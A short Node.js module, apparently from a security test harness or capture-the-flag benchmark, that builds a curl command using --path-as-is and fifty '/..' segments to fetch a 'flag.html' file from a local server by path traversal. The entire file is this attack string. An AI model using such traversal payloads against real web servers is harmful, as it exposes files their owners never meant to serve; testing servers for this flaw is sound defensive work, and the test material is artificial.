const path = require('path');  // Import the path module

function getPayload() {
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }

  return {
    attack_string: `curl -v --path-as-is "http://127.0.1:8890${genstr()}"`
  };
}

module.exports = { getPayload };